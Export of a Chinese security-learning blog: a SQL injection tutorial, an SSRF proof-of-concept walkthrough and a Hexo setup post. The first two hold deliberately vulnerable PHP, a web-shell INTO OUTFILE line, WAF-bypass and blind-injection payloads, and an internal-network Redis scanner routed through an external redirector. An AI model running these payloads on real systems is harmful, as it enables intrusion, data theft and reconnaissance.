DATABASE usertable",$con)) &#123; echo "Database created"; &#125;else &#123; echo "Error creating database: " . mysql_error(); &#125;# 选择和创建表mysql_select_db("usertable", $con);$sql = "CREATE TABLE Persons (userid varchar(15),username varchar(15),passwd varchar(15))";mysql_query($sql,$con);mysql_close($con);?&gt; 登陆前端（post表单提交方式）123456789&lt;form action="action_page.php",methon="post"&gt;First name:&lt;br&gt;&lt;input type="text" name="name" value="Mickey"&gt;&lt;br&gt;Last name:&lt;br&gt;&lt;input type="password" name="password" value="Mouse"&gt;&lt;br&gt;&lt;br&gt;&lt;input type="submit" value="Submit"&gt;&lt;/form&gt; action_page.php1234567891011121314151617181920212223242526272829303132333435363738&lt;?phperror_reporting(0);$con = mysql_connect("localhost","root","wearefamily");mysql_select_db("usertable", $con);$name=$_POST["name"];$passwd=$_POST["password"];$check_query = mysql_query("SELECT userid FROM persons where username = '$name' and passwd ='$passwd'");$result = mysql_fetch_array($check_query);if($result) &#123; echo " &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Login successfully!&lt;/h1&gt; &lt;h2&gt;hello $result &lt;/h2&gt;&lt;/body&gt; &lt;/html&gt;";&#125;else&#123; echo "Error，you are not admitted!: ";&#125;?&gt;'''&#125; &#125; 5.一些比较特殊的注入接下来将对以上action_page.php做一些修改，就可以实现以下的攻击环境。 5.1 sql约束攻击 5.1.1 小常识：在mysql里面的可以用set语句来进行用户变量的定义和修改，同时使用@指定用户变量；同样set语句可以用来动态设定系统变量（设置后只影响当前的客户端），用@@指定系统变量。mesql常见系统变量传送门(5.3.3.1) 5.1.2 所谓的约束指的就是对于column约束的最大长度，当set @@sql_mode=ANSI 的情况下会造成自截断，然后随意注册新的用户（新的用户名和原有用户名一样，这样在数据插入语句insert into语句会自动实现根据创建表格字段的限制长度来自截断，在select语句中（常常用在判断是否与现有账户重名的先验函数中）不会根据表单字段来自截断）。换而言之，就是攻击者在注册时可以很好的绕过重名检测函数，然后在正真的数据插入时候，实现截断，把原来用户名“覆盖”，这样一来，基于username的资源分配方案就会成功被窃取。 5.1.3 hack原始数据表数据 注册一个admin .................................1用户，发现注册成功！（“.”表示空格） 注册后的数据表 登陆 5.1.4 参考链接SQL Attack (Constraint-based) 5.2 sql注入之文件操作和传shell这个攻击和dns带外攻击的方式有相同的地方，通过一些注入文件操作函数outfile/dumpfile(通过包含文件操作的sql语句直接往本地写入shell文件，或者把本地的文件传输到远端的具有公网的主机。至于需要传输的文件是啥，只要在权限允许范围内，It is up to you),还有就是load_file(你可以重远程加载shell或者一些恶意文件到漏洞机，以方便实现后续的工作) 以本地wamp为例，这里注意两点，一句话需要双括号括起来，同时在文件地址的书写上注意是&#39;/&#39;而不是&#39;\&#39;,否则写入出错。1SELECT &quot;&lt;?php @eval($_POST[&apos;hello&apos;])?&gt;&quot; INTO OUTFILE &quot;C:/wamp64/www/sql/shell.php&quot;; 5.3 sql二次注入二次注入单单从字面意思上来看，就是注入不是直接发生的，而是在第二次从数据库中取出污染数据源来合成sql语句的时候在服务器后端脚本语言中产生了错误闭合，从而使得闭合混乱的参数容易被利用。最常用的是手段是在第一次的时候php addlashes（）函数对输入简单进行转义，而不是直接正则替换，这样使得敏感字符例如“\”进入数据库。在数据取出进行第二次类似select查询的时候产生注入点。至于闭合的手段十分灵活，二次利用的正真实现还是比较有难度的。关键在于第二次查询点的寻找以及灵活闭合。最为麻烦的是一些table的字段是限制死了长度的，这就使得注入利用有点鸡肋。笔者认为要想防御这个就得对输入做好严格过滤，同时在关键查询语句上，对数据库里面的数据也要做到相应的检测，而不是完全信任。 5.4 HPP（http参数污染),HPF(HTTP Parameter Fragment),HPC(HTTP Parameter Contamination)HPP:所谓的参数污染就是指在实际web应用中,通常是在实际的apach这类的服务器前面加上一个其他服务器例如tomcat作为waf,那么在这中情况下，就会出现两个服务器如果配置不恰当，对参数的处理不一致，从而造成http参数污染。下面是一些常见的参数不统一造成的参数污染。比较常见的payload如下所示 HPF:这种方法是HTTP分割注入,把需要注入的语句分别包含在两个可控的同一个sql语句里面，从而实现绕过123/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— HPC:这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染 RFC2396定义了如下一些字符： 123Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()Reserved : ; / ? : @ &amp; = + $ ,Unwise : &#123; &#125; | \ ^ [ ] ` 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：123456789101112131415161718192021222324252627282930313233343536373839404142Query string and Web server response (Example) +-----------------------------------------------------------+ | Query String | Web Servers response / GET values | +-----------------------------------------------------------+ | | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP | +-----------------------------------------------------------+ | ?test[1=2 | test_1=2 | test[1=2 | | ?test=% | test=% | test= | | ?test%00=1 | test=1 | test=1 | | ?test=1%001 | NULL | test=1 | | ?test+d=1+2 | test_d=1 2 | test d=1 2 | +-----------------------------------------------------------+ Magic character &quot;%&quot; affect to ASP/ASP.NET +--------------------------------------------------------------------+ | Keywords | WAF | ASP/ASP.NET | +--------------------------------------------------------------------+ | sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. | | ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx | | &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; | | &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; | +--------------------------------------------------------------------+#Real world examples: 1. Bypass Mod_Security SQL Injection rule (modsecurity_crs_41_sql_injection_attacks.conf) Forbidden: http://localhost/?xp_cmdshell Bypassed : http://localhost/?xp[cmdshell 2. Bypass URLScan 3.1 DenyQueryStringSequences rule Forbidden: http://localhost/test.asp?file=../bla.txt Bypassed : http://localhost/test.asp?file=.%./bla.txt 3. Bypass AQTRONIX Webknight (WAF for IIS and ASP/ASP.Net) Forbidden: http://victim.com/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables) Bypassed : http://victim.com/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables) 5.5 二次解码二次解码可以说和hpp有相似之处，都是在web服务器加了waf后的一种常见绕过方式或者说是注入技巧。试想两个服务器都对用户的输入做同样的解码，那么二次加密后的攻击向量必然可以绕过waf的检测，从而影响后端主要服务器的安全。这是一种比较常见的情形。下面收集了一些常见的web类应用的码类。12345678unlencode base64 json binary querystring htmlencode unicode php serialize 5.6 宽字节注入 5.6.1 宽字节注入原理：GBK 占用两字节（也就是宽字节），ASCII占用一字节，PHP中编码默认为utf-8，MYSQL设置的字符集是GBK等宽字节字符集。具体：输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\ 变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符 5.6.2 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时，两边的编码不一致，导致转义的\与&#39;在数据库中被当成一个字符，从而&#39;逃逸。 条件：因此只要第一个字节的ascii码大于128且和%5c结合是一个汉字，就可以成功绕过了。这种场景经常出现在绕过mysql_real_escape_string()，addslashes()函数的情景。 注意除了数据库设置成gbk编码的方式，其他的ANSI编码族的编码方式都是可以存在宽字节绕过的，如big5等。一个在线获取宽字节编码的网址编码详解 5.7 堆叠注入所谓的堆叠注入，就是在一般的一次执行一句sql语句的后面加入；来顺序执行多条语句，利用方式给根据实战场景可以比较灵活。 5.8 order by注入这里的order by 与 limitsql语句后的注入是与where的注入有所不同，主要差异是where语句后面可以用union来进行联合查询,但是order by与limit后面的注入就是不可以的。在sql注入的初期，我们通常自己构造order by 语句来猜测表的列数和相关列的数据类型。但是这里的order by和我们之前主动构造的order by语句不一样，注入点在服务端sql语句的order by后面，基于sql语句的规范，这里的注入常常是不可以进行运算和union语句的，利用的方式其实本质上还是盲注，只是通过一些逻辑连接来达到目的。 123456789101112131415161718192021222324#语法SELECT IF(1=1, true, false);SELECT CASE WHEN 1=1 THEN true ELSE false END;--if/?order=IF(1=1,name,price) 通过name字段排序/?order=IF(1=2,name,price) 通过price字段排序--regexp/?order=(select+1+regexp+if(1=1,1,0x00)) 正常/?order=(select+1+regexp+if(1=2,1,0x00)) 错误--updatexml/?order=updatexml(1,if(1=1,1,user()),1) 正确/?order=updatexml(1,if(1=2,1,user()),1) 错误--extractvallue/?order=extractvalue(1,if(1=1,1,user())) 正确/?order=extractvalue(1,if(1=2,1,user())) 错误--数据猜解/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误...... 5.9 带外查询 5.9.1 最常用的通道是DNS，攻击者说服数据库执行一次名称查找，该查找包含一个由攻击者控制的域名并在域名前添加了一些要提取的数据。当请求到达DNS名称服务器后，攻击者就可以查看数据。其他通道还包括HTTP和SMTP 5.9.2 dns带外查询就是用来突破注入中没有数据回显的情况，通过类似load_file函数将要查询的东西和域名concat起来，那么就可以通过dns_log来查看返回的东西，从而加快了没有回显的盲注效率。 5.9.3 先决条件：MySQL中有一个名为secure_file_priv的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的操作。要想在mysql5.7以上的版本有效，必须把其在配置文件设置为null。注意这个文件不可以动态修改，也就是说只能够在还没有启动前就把配置文件写好。 6. 参考文章：[1]w3school[2]易佰教程[3]mysql官方文档)[4]mysql中文文档[5]国外的sql注入总结网站[6]sql注入天书[7]突破延迟注入和盲注速度限制，利用dns注入快速获取数据[8]深入探究宽字节注入漏洞与修补原理[9]浅析白盒审计中的字符编码及SQL注入[10]SQL Attack (Constraint-based)[11]ceye_dns_log平台[12]DNSlog[13]MySQL Out-of-Band 攻击[14]MySQL Order By 注入总结]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[poc study]]></title>
    <url>%2F2017%2F10%2F16%2FLearning-with-poc%2F</url>
    <content type="text"><![CDATA[漏洞发布网站点（乌云备份）关键词：ssrf漏洞对源代码的拆分理解1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import requestsimport threadingimport Queueimport randomimport time#---------------------------------------------------------def run(): while que.qsize() &gt; 0: ip = que.get() try: payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="65321") param = &#123;"imgurl":payload&#125; r = requests.post(url,data=param,headers = headers,timeout=2.2) try: payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="6379") param = &#123;"imgurl":payload&#125; r = requests.post(url,data=param,headers=headers,timeout=2.2) lock.acquire() print ip lock.release() except : lock.acquire() print "&#123;ip&#125; 6379 Open".format(ip=ip) lock.release() except: pass# 生成伪造ip用于请求头def getIp(): return str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))#--------------------------------------------------------url = "http://st.so.com/stu"threads_count = 3que = Queue.Queue()#实体化fifo的队列lock = threading.Lock()#实体化一个线程锁threads = []#建立保存线程的列表ip = "10.121.3."#初始化一个ip网段，实现针对ssrf漏洞的对内网的扫描headers = &#123;#请求头的构造可通过抓包工具，或者hackbar等小工具实现结构仿造 "Cache-Control":"max-age=0", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36", "Cookie": "__guid=6491553.4279294988408965000.1467944097350.527; PHPSESSID=d88gvotjet30c0cp28iuv1s771; count=45", "Content-Type":"application/x-www-form-urlencoded", "X-Forwarded-For":getIp(),&#125;for i in range(1,255):#新建进程排序对列 que.put(ip + str(i))for i in range(threads_count): t = threading.Thread(target=run) threads.append(t) t.setDaemon(True)#打开主线程为守护进程 t.start()while que.qsize() &gt; 0: time.sleep(1.0)#在打开守护进程的环境下保证等候队列执行到空 学习资料链接： python thread库 python quene库 ssrf背景与302跳转之类的绕过 6379 port 漏洞情况 http302状态码 “X-Forwarded-For”在http协议层上的ip伪造理解 反思： ssrf漏洞和xss漏洞有着相似的实现手法，尽管xss分为存储型和反射型，但都是在client端实现攻击（即使 存储型是存储在服务端，但攻击的对象仍是client），类似于”document.cookie”，脚本执行和跳转等，但是ssrf是基于server端,让服务器作为跳板去实现本身无法从外网对内网的操作，如嗅探以及漏洞利用。 对poc的一点理解与感悟： 攻击具有一定的伪装功能，getIP（）中x-forwarded-for请求头的合理应用，实现了IP层以上的身份隐藏（因为无法实现tcp握手包的欺骗），并且不只是定向的扫描一个端口（容易被墙），额外扫描了65321端口（读者才浅，一时不知道为何要这么扫描，生搬硬套，勿怪，还望高人指点） 然后就是运行的性能上，调用了线程，锁，以及等待FIFO对列，加速了扫描的速度。 302跳转实质就是构造一个指向另一个location的并且可以传递攻击参数的自定义php文件，让存在ssrf漏洞的服务主机去访问，从而跳转到内网（有点绕，简单就是在确保服务器会访问你的web文件的前提下构造个你自己本地php脚本让它跳转到被攻击服务器内网），进而继续实现漏洞利用。附上该302攻击的 exp.php： 1234567&lt;?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?&gt; 整个poc的关键代码： 12345payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="6379")param = &#123;"imgurl":payload&#125;r = requests.post(url,data=param,headers=headers,timeout=2.2)]]></content>
      <categories>
        <category>poc_learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hello blog]]></title>
    <url>%2F2017%2F03%2F26%2Fhello-blog(1)%2F</url>
    <content type="text"><![CDATA[兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式： 去新浪，blogz等博客网站去申请账号开始大众化的博客之路。这方式最简单，当然自由度不高，无法获取源代码，也无法做很多关于基层的代码操作，界面也无法实现个性化，总之就是比较受限制。 自己买服务器，数据库，虚拟主机（现在有较多国内国外的提供服务商：阿里云，百度云，腾讯云，亚马逊云，凡科建站and so on）&lt;!—这类方式就是花钱买服务，比如服务器流量与内存。如果是购买云之类的话，用wordpress搭建还算简单的，就是有点小贵，不算买域名，就是说运用人家的二级域名的话，一年也要好几百，感觉是有点贵的。当然如果你想去自己买个实体服务器来折腾也是可以的，前提是有足够的money，而且还要自己去搭建环境，总的来说似乎是不适合我们学生群体的。 该类方法就是通过开源社区作为网站挂载平台，例如cording，github，……，不需要像上面第二点提到的那样自己去管理网站，它寄人篱下却又能给你极大的自主性，代码开源，就意味着你完全可以自己去搭建想要的blog，最最重要的是你不买域名的话基本花不了一分钱，买域名一年也不贵嘛，星巴克一两杯coffee的钱就搞定了。而且由于是开源，这类blog的建立就会受到社区的大力支持，他们各种的开源工具也会为你提供方便，很多代码都是集成的的，只需要改点个性化的参数就可以了，很是便利的呢！ 废话不多说，直接上干货 本次采用的形式是github page+hexo的环境（当然node，git，markdown编辑器还是要安装的啦）好了，说说我建站的过程吧： 首先当然是去github里面注册个账号 然后新建个repostory，修改名字为：【yourname】.github.io(这是硬性规定，想要以github page 模块建站就必须按这样的格式去做)，到这部分结束你就可以说是建立好了一个网站的基点，一个托管在github开源社区的 下载我之前所叙述的种种工具，也就是最基本的环境搭建 注：由于是自己的总结，加上网上教程很多，这里给出一些连接，方便细节的处理： Hexo 入门指南一 (当然也还有各种博客里说了这种建站方式，很多方法大同小异) 具体的部署过程上面的链接基本都会有介绍下面就来说说我目前建站的坑吧： 1.在本地clone的库里部署好hexo后_config.yml的参数设置需要谨慎，一定记得在item：后加个空格再修改参数，还有就是最好留个备份。2.在下载hexo时最好和git关联：npm install hexo-server —save npm install hexo-deployer-git —save不然的话在后期上传时，使用hexo deploy时出现cannot find the git的错误呢 3.下载git时最好还是在安装过程中：into path选项打勾，不然要自己去设置环境path参数，即把git文件里bin文件的位置添加到path（所谓path即为我的计算机里的高级设置里的环境变量的设置）]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
</search>
